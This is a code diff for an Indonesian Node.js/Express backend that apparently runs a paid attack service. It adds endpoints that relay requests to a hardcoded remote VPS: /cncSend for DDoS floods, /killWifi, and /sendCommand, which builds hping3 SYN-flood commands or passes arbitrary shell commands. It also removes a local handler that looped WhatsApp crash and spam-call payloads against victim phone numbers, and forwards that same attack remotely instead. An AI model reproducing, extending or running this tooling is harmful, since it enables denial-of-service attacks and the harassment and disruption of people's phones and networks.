@@ -460,6 +460,160 @@ try {
   }
 } catch(e){ console.log('ZC seed err', e.message); }
 
+// ===== PETRO FORWARD (Railway utama, Petro Funx eksekutor VPS+WA) =====
+const axiosPetro = (() => { try { return require("axios"); } catch(e){ return null; } })();
+const PETRO_URL = (process.env.PETRO_URL || "http://pterodactyl-free-node-2.hostkita.help:20702").replace(/\/$/, "");
+const PETRO_KEY = process.env.PETRO_KEY || "";
+function petroUser(req) {
+  const key = (req.query && req.query.key) || (req.body && req.body.key);
+  if (!key) return null;
+  try {
+    const ki = resolveKeyInfo(key);
+    if (ki) {
+      const db = loadDatabase();
+      const u = db.find(x => x.username === ki.username);
+      if (u) return { user: u.username, role: u.role || "member" };
+      return { user: ki.username, role: "member" };
+    }
+  } catch(e){}
+  try {
+    const zc = loadZC();
+    if (zc && zc.users) {
+      const zu = zc.users.find(x => x.key === key);
+      if (zu) return { user: zu.username, role: zu.role || "member" };
+    }
+  } catch(e){}
+  return null;
+}
+async function petroGet(p, params, timeoutMs) {
+  if (!axiosPetro || !PETRO_URL || !PETRO_KEY) return { __offline: true };
+  try {
+    const r = await axiosPetro.get(PETRO_URL + p, { params: Object.assign({}, params, { petro: PETRO_KEY }), timeout: timeoutMs || 20000, validateStatus: () => true });
+    const body = (r.data && typeof r.data === "object") ? r.data : { raw: r.data };
+    body.__status = r.status;
+    return body;
+  } catch (e) { return { __offline: true, __err: String(e && e.message || e).slice(0,200) }; }
+}
+function qp(req, ...names) {
+  for (const n of names) {
+    if (req.query && req.query[n] !== undefined) return req.query[n];
+    if (req.body && req.body[n] !== undefined) return req.body[n];
+  }
+  return undefined;
+}
+// --- My VPS List: LOCAL (db.json servers, raw array, GET+POST) ---
+function vpsRaw() {
+  try {
+    const zc = loadZC();
+    if (zc && Array.isArray(zc.servers)) return zc.servers.map(s => ({ id: s.id, host: s.host, username: s.username || s.name || "", name: s.name, status: s.status }));
+  } catch(e){}
+  return [];
+}
+function handleMyServer(req, res) {
+  const pu = petroUser(req);
+  if (!pu) return res.status(401).json({ valid: false, message: "invalid key" });
+  res.json(vpsRaw());
+}
+function handleAddServer(req, res) {
+  const pu = petroUser(req);
+  if (!pu) return res.json({ added: false, success: false, message: "invalid key" });
+  const host = qp(req, "host", "ip", "serverHost");
+  const username = qp(req, "username", "user");
+  const name = qp(req, "name", "serverName") || username || "Server";
+  if (!host) return res.json({ added: false, success: false, message: "missing host" });
+  try {
+    const rawZC = loadRawZC();
+    rawZC.servers = rawZC.servers || [];
+    const srv = { id: Date.now().toString(), name, host, username: username || "", status: "online", createdBy: pu.user, time: new Date().toISOString() };
+    rawZC.servers.push(srv); saveRawZC(rawZC);
+    try { const line = `${pu.user} AddedServer ${name} ${host}\n`; fs.appendFileSync("logUser.txt", line); } catch(e){}
+    return res.json({ added: true, success: true, server: srv, status: true, message: "VPS added" });
+  } catch(e){ return res.json({ added: false, success: false, message: e.message }); }
+}
+function handleDelServer(req, res) {
+  const pu = petroUser(req);
+  if (!pu) return res.json({ deleted: false, success: false, message: "invalid key" });
+  const ident = qp(req, "host", "ip", "id");
+  try {
+    const rawZC = loadRawZC();
+    rawZC.servers = rawZC.servers || [];
+    const before = rawZC.servers.length;
+    if (ident) rawZC.servers = rawZC.servers.filter(s => !(s.host === ident || s.id === ident));
+    saveRawZC(rawZC);
+    const gone = before !== rawZC.servers.length;
+    return res.json({ deleted: true, success: true, status: true, message: gone ? "VPS deleted" : "VPS not found" });
+  } catch(e){ return res.json({ deleted: false, success: false, message: e.message }); }
+}
+app.get("/myServer", handleMyServer);
+app.post("/myServer", handleMyServer);
+app.get("/addServer", handleAddServer);
+app.post("/addServer", handleAddServer);
+app.get("/delServer", handleDelServer);
+app.post("/delServer", handleDelServer);
+// --- VPS tools + WA: FORWARD Petro ---
+async function handleCnc(req, res) {
+  const pu = petroUser(req);
+  if (!pu) return res.json({ valid: false, message: "invalid key" });
+  const r = await petroGet("/cncSend", { target: qp(req,"target"), port: qp(req,"port"), duration: qp(req,"duration"), ddos: qp(req,"ddos") });
+  if (r.__offline) return res.json({ valid: true, sended: false, cooldown: false, message: "VPS Petro offline, coba lagi." });
+  delete r.__status; res.json(r);
+}
+async function handleKill(req, res) {
+  const pu = petroUser(req);
+  if (!pu) return res.status(401).json({ valid: false, message: "invalid key" });
+  const r = await petroGet("/killWifi", { target: qp(req,"target"), duration: qp(req,"duration"), dry: qp(req,"dry") });
+  if (r.__offline) return res.status(502).json({ valid: false, message: "VPS Petro offline, coba lagi." });
+  if (r.valid !== true) return res.status(502).json(r);
+  res.json(r);
+}
+async function handleSendCmd(req, res) {
+  const pu = petroUser(req);
+  if (!pu) return res.json({ valid: false, success: false, message: "invalid key" });
+  let cmd = qp(req, "cmd");
+  if (!cmd && qp(req, "target")) {
+    const port = qp(req, "port") || "80";
+    cmd = `hping3 --flood -S ${String(qp(req,"target")).replace(/[^a-zA-Z0-9.\-]/g,"")} -p ${String(port).replace(/\D/g,"")}`;
+  }
+  const r = await petroGet("/sendCommand", { cmd: cmd || "" });
+  if (r.__offline) return res.json({ valid: false, success: false, message: "VPS Petro offline, coba lagi." });
+  if (r.valid === undefined) r.valid = true;
+  if (r.success === undefined) r.success = r.valid;
+  res.json(r);
+}
+async function handleServerInfo(req, res) {
+  const pu = petroUser(req);
+  if (!pu) return res.status(401).json({ valid: false });
+  const r = await petroGet("/getServerInfo", {});
+  if (r.__offline || r.valid !== true) {
+    return res.json({ valid: true, server: { name: "Railway", status: "online", uptime: process.uptime(), petro: "offline" }, user: { username: pu.user, role: pu.role } });
+  }
+  delete r.__status; res.json(r);
+}
+async function handleSenderStats(req, res) {
+  const pu = petroUser(req);
+  if (!pu) return res.json({ valid: false, message: "invalid key" });
+  const r = await petroGet("/getSenderStats", { user: pu.user });
+  if (r.__offline) return res.json({ valid: false, message: "VPS Petro offline" });
+  res.json(r);
+}
+async function handleDelSender(req, res) {
+  const pu = petroUser(req);
+  if (!pu) return res.json({ valid: false, message: "invalid key" });
+  const r = await petroGet("/deleteSender", { user: pu.user, id: qp(req, "id") });
+  if (r.__offline) return res.json({ valid: false, message: "VPS Petro offline, coba lagi." });
+  if (r.valid === undefined) r.valid = !!r.deleted;
+  res.json(r);
+}
+app.get("/cncSend", handleCnc);
+app.post("/cncSend", handleCnc);
+app.get("/killWifi", handleKill);
+app.get("/sendCommand", handleSendCmd);
+app.post("/sendCommand", handleSendCmd);
+app.get("/getServerInfo", handleServerInfo);
+app.get("/getSenderStats", handleSenderStats);
+app.delete("/deleteSender", handleDelSender);
+app.get("/deleteSender", handleDelSender);
+app.post("/deleteSender", handleDelSender);
 // GET /myServer
 app.get("/myServer", (req, res) => {
   const key = req.query.key;
@@ -1086,160 +1240,18 @@ app.post("/changepass", (req, res) => {
 });
 
 app.get("/sendBug", async (req, res) => {
-  const { key, bug } = req.query;
-  let { target } = req.query;
-  { const d = String(target || "").replace(/\D/g, ""); if (d.startsWith("0")) target = "62" + d.slice(1); else if (d.startsWith("8")) target = "62" + d; else target = d; }
-  console.log(`[📤 BUG] Send bug to ${target} using key ${key} - Bug: ${bug}`);
-
-  const keyInfo = resolveKeyInfo(key);
-  if (!keyInfo) {
-    console.log("[❌ BUG] Key tidak valid.");
-    return res.json({ valid: false });
-  }
-
-  const db = loadDatabase();
-  const user = db.find(u => u.username === keyInfo.username);
-  if (!user) {
-    console.log("[❌ BUG] User tidak ditemukan.");
-    return res.json({ valid: false });
-  }
-
-  // ===== Role-based Cooldown =====
-  const roleCooldowns = {
-    member: 300,
-    reseller: 240,
-    reseller1: 60,
-    owner: 0,
-    vip: 60,
-  };
-  const role = user.role || "member";
-  const cooldownSeconds = roleCooldowns[role] || 60;
-
-  if (!user.lastSend) user.lastSend = 0;
-
-  const now = Date.now();
-  const diffSeconds = Math.floor((now - user.lastSend) / 1000);
-  if (diffSeconds < cooldownSeconds) {
-    console.log(`${user.username} Still Cooldown`)
-    return res.json({
-      valid: true,
-      sended: false,
-      cooldown: true,
-      wait: cooldownSeconds - diffSeconds,
-    });
-  }
-
-  // ============ Respon Duluan ============ //
-  user.lastSend = now;
-  saveDatabase(db); // Penting! Simpan waktu kirim ke file
-  console.log(`${user.username} Trigger Cooldown`);
-
-  res.json({
-    valid: true,
-    sended: true,
-    cooldown: false,
-    role
-  });
-
-  // ============ Kirim Bug di Background ============ //
-  setImmediate(async () => {
-    const isMessBug = false;
-    console.log("Received Signal")
-    const attemptSend = async (sock, retry = false) => {
-      try {
-        const targetJid = target + "@s.whatsapp.net";
-    console.log("Received Signal 2")
-    console.log(`${targetJid}`)
-        switch (bug) {
-          case "click":
-            for (let i = 0; i < 15; i++) {
-              await FreezePackk(sock, targetJid);
-              await sleep(1000);
-            }
-            break;
-          case "crash_spam":
-            for (let i = 0; i < 10; i++) {
-              await FreezePackk(sock, targetJid);
-              await QcPay(sock, targetJid);
-              await iosLx(sock, targetJid)
-              await sleep(1000);
-            }
-            break;
-          case "hard":
-            for (let i = 0; i < 5; i++) {
-              await QcPay(sock, targetJid);
-              await iosLx(sock, targetJid)
-              await permenCall(sock, targetJid);
-              await sleep(1000)
-              await FreezePackk(sock, targetJid);
-              await QcPay(sock, targetJid);
-              await sleep(1000)
-              await FreezePackk(sock, targetJid);
-              await QcPay(sock, targetJid);
-              await sleep(1000)
-              await sleep(10000);
-            }
-            break;
-          case "spam_call":
-            for (let i = 0; i < 30; i++) {
-              await permenCall(sock, targetJid);
-              await sleep(30000);
-            }
-            break;
-          case "android":
-            for (let i = 0; i < 20; i++) {
-              await videoBlank(sock, targetJid);
-              await sleep(1000);
-            }
-            break;
-          case "invisible":
-            for (let i = 0; i < 50; i++) {
-              await gsGlx(sock, targetJid);
-              await sleep(10000);
-            }
-            break;
-          case "ios_invis":
-            for (let i = 0; i < 1; i++) {
-              await iosLx(sock, targetJid);
-            }
-            break;
-          case "cxinv":
-            for (let z = 0; z < 200; z++) {
-              await callCrash(sock, targetJid)
-              await sleep(9000)
-            }
-          break;
-          case "ios_noinvis":
-            for (let i = 0; i < 15; i++) {
-              await iOSxTend(sock, targetJid);
-            }
-            break;
-        }
-
-        console.log(`[✅ BUG] Bug '${bug}' terkirim ke ${target}`);
-        return true;
-      } catch (err) {
-        console.warn(`[⚠️ SEND ERROR] ${err.message}`);
-        if (sessionName && err.message === 'Connection Closed') {
-          delete activeConnections[sessionName];
-        }
-        if (!retry) {
-          const retrySock = await checkActiveSessionInFolder(user.username);
-          if (retrySock) return await attemptSend(retrySock, true);
-        }
-        console.warn(`[❌ GAGAL] Kirim bug '${bug}' ke ${target}`);
-        return false;
-      }
-    };
-
-    const sock = await checkActiveSessionInFolder(user.username);
-    if (!sock) {
-      console.warn(`[❌ NO SOCK] Tidak ada koneksi ${isMessBug ? 'Messenger' : 'aktif'} tersedia.`);
-      return;
-    }
-
-    await attemptSend(sock);
-  });
+  const pu = petroUser(req);
+  if (!pu) return res.json({ valid: false, message: "invalid key" });
+  const r = await petroGet("/sendBug", { user: pu.user, role: pu.role, target: qp(req, "target"), bug: qp(req, "bug") }, 25000);
+  if (r.__offline) return res.json({ valid: false, sended: false, message: "VPS Petro offline, coba lagi." });
+  delete r.__status; res.json(r);
+});
+app.post("/sendBug", async (req, res) => {
+  const pu = petroUser(req);
+  if (!pu) return res.json({ valid: false, message: "invalid key" });
+  const r = await petroGet("/sendBug", { user: pu.user, role: pu.role, target: qp(req, "target"), bug: qp(req, "bug") }, 25000);
+  if (r.__offline) return res.json({ valid: false, sended: false, message: "VPS Petro offline, coba lagi." });
+  delete r.__status; res.json(r);
 });
 
 // Normalisasi nomor ID: +62 / 62 / 08 / 8 -> 62...
@@ -1308,154 +1320,38 @@ function getActiveCredsInFolder(subfolderName) {
   return activeCreds;
 }
 
-// GET /mySender
-app.get("/mySender", (req, res) => {
-  const { key } = req.query;
-  const keyInfo = resolveKeyInfo(key);
-  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });
-
-  const db = loadDatabase();
-  const user = db.find(u => u.username === keyInfo.username);
-  if (!user) return res.status(401).json({ error: "User not found" });
-
-  const conns = getActiveCredsInFolder(user.username);
-  console.log(user.username)
-  return res.json({
-    valid: true,
-    connections: conns
-  });
+// GET /mySender -> Petro (sesi WA hidup di VPS)
+app.get("/mySender", async (req, res) => {
+  const pu = petroUser(req);
+  if (!pu) return res.status(401).json({ error: "Invalid session key" });
+  const r = await petroGet("/mySender", { user: pu.user });
+  if (r.__offline) return res.json({ valid: true, connections: [], result: [], petro: "offline" });
+  if (!Array.isArray(r.connections)) r.connections = [];
+  if (!Array.isArray(r.result)) r.result = r.connections;
+  res.json(r);
+});
+app.post("/mySender", async (req, res) => {
+  const pu = petroUser(req);
+  if (!pu) return res.status(401).json({ error: "Invalid session key" });
+  const r = await petroGet("/mySender", { user: pu.user });
+  if (r.__offline) return res.json({ valid: true, connections: [], result: [], petro: "offline" });
+  res.json(r);
 });
 
-// 🔹 Endpoint getPairing (normalisasi +62/62/08/8, cek eksistensi, single-socket)
+// GET /getPairing -> Petro (IP bersih, single-socket)
 app.get("/getPairing", async (req, res) => {
-  const { key } = req.query;
-  let { number } = req.query;
-  const keyInfo = resolveKeyInfo(key);
-  if (!keyInfo) {
-    console.log("[❌ BUG] Key tidak valid.");
-    return res.json({ valid: false, message: "Invalid session key" });
-  }
-
-  const db = loadDatabase();
-  const user = db.find(u => u.username === keyInfo.username);
-  if (!user) return res.status(401).json({ error: "Invalid session key" });
-
-  if (!number) return res.status(400).json({ error: "Number is required" });
-
-  // 1. Normalisasi: +62 / 62 / 08 / 8 -> 62...
-  const norm = normalizeID(number);
-  if (!norm.ok) return res.json({ valid: false, message: norm.message });
-  number = norm.number;
-
-  try {
-  const sessionDir = path.join('permenmd', user.username, number);
-
-  if (!fs.existsSync(`permenmd/${user.username}`)) fs.mkdirSync(`permenmd/${user.username}`, { recursive: true });
-  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });
-
-  // 2. Sudah terhubung? Jangan keluarkan kode baru (itu yang menggugurkan kode lama)
-  try {
-    const credsFile = path.join(sessionDir, 'creds.json');
-    if (fs.existsSync(credsFile)) {
-      const cj = JSON.parse(fs.readFileSync(credsFile, 'utf8'));
-      if (cj.registered && activeConnections[number]) {
-        return res.json({ valid: true, number, pairingCode: null, alreadyLinked: true, message: "Nomor sudah terhubung. Gunakan Refresh." });
-      }
-    }
-  } catch(e){}
-
-  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
-  const { version } = await fetchLatestBaileysVersion();
-
-  const sock = makeWASocket({
-    keepAliveIntervalMs: 50000,
-    logger: pino({ level: "silent" }),
-    auth: state,
-    syncFullHistory: true,
-    markOnlineOnConnect: true,
-    connectTimeoutMs: 60000,
-    defaultQueryTimeoutMs: 0,
-    generateHighQualityLinkPreview: true,
-    browser: ["Ubuntu", "Chrome", "20.0.04"],
-    version
-  });
-
-  sock.ev.on("creds.update", saveCreds);
-
-  // Simpan referensi agar sesi tidak hilang setelah response
-  activeConnections[number] = sock;
-
-  // JANGAN spawn socket kedua saat close (itu menggugurkan kode). Catat saja.
-  sock.ev.on("connection.update", async (update) => {
-    const { connection, lastDisconnect } = update;
-    if (connection === "close") {
-      const code = lastDisconnect?.error?.output?.statusCode;
-      const loggedOut = code === DisconnectReason.loggedOut;
-      console.log(`🔌 pairing sock ${number} closed (${code})`);
-      if (loggedOut) delete activeConnections[number];
-    } else if (connection === "open") {
-      console.log(`✅ pairing sock ${number} linked/open`);
-      try {
-        const src = path.join(sessionDir, 'creds.json');
-        const dst = path.join('permenmd', user.username, `${number}.json`);
-        if (fs.existsSync(src)) fs.writeFileSync(dst, fs.readFileSync(src));
-      } catch(e){}
-    }
-  });
-
-  // 3. Tunggu socket connect sebelum verifikasi & kode (maks 12 detik)
-  const connected = await waitForSockOpen(sock, 12000);
-
-  // 4. Cek eksistensi nomor di WhatsApp sebelum keluarkan kode
-  try {
-    let checker = null;
-    for (const k of Object.keys(activeConnections)) {
-      const s = activeConnections[k];
-      if (s && s !== sock && s.user) { checker = s; break; }
-    }
-    if (!checker && connected && sock.onWhatsApp) checker = sock;
-    if (checker && checker.onWhatsApp) {
-      let chk = null;
-      try { chk = await checker.onWhatsApp(number); } catch(e){ chk = null; }
-      if (Array.isArray(chk) && chk.length && !chk[0]?.exists) {
-        return res.json({ valid: false, message: "Nomor tidak terdaftar di WhatsApp. Periksa nomornya." });
-      }
-    }
-  } catch(e) {
-    console.log(`[⚠️ onWhatsApp] ${number}: ${e.message}`);
-  }
-
-  // 5. Generate pairing code (satu socket saja)
-  if (!sock.authState.creds.registered) {
-    let code = null;
-    let lastErr = null;
-    try {
-      code = await sock.requestPairingCode(number);
-    } catch(e) {
-      lastErr = e;
-      console.log(`[⚠️ pairing retry] ${number}: ${e.message}`);
-      await waiting(5000);
-      try {
-        code = await sock.requestPairingCode(number);
-      } catch(e2) {
-        lastErr = e2;
-        console.log(`[⚠️ pairing retry2] ${number}: ${e2.message}`);
-      }
-    }
-    if (code) {
-      console.log(code);
-      return res.json({ valid: true, number, pairingCode: code });
-    }
-    const msg = String(lastErr && lastErr.message || "");
-    if (/closed|connect|timeout|network|socket/i.test(msg)) {
-      return res.json({ valid: false, message: "Koneksi server ke WhatsApp terputus. Tunggu 30 detik lalu coba lagi (jangan spam request)." });
-    }
-    return res.json({ valid: false, message: "Gagal membuat kode. Coba lagi." });
-  }
-  return res.json({ valid: true, number, pairingCode: null, alreadyLinked: true, message: "Nomor sudah terhubung. Gunakan Refresh." });
-  } catch (err) {
-    return res.status(500).json({ error: err.message });
-  }
+  const pu = petroUser(req);
+  if (!pu) return res.json({ valid: false, message: "Invalid session key" });
+  const r = await petroGet("/getPairing", { user: pu.user, number: qp(req, "number") }, 55000);
+  if (r.__offline) return res.json({ valid: false, message: "VPS Petro offline, coba lagi." });
+  delete r.__status; res.json(r);
+});
+app.post("/getPairing", async (req, res) => {
+  const pu = petroUser(req);
+  if (!pu) return res.json({ valid: false, message: "Invalid session key" });
+  const r = await petroGet("/getPairing", { user: pu.user, number: qp(req, "number") }, 55000);
+  if (r.__offline) return res.json({ valid: false, message: "VPS Petro offline, coba lagi." });
+  delete r.__status; res.json(r);
 });
 
 
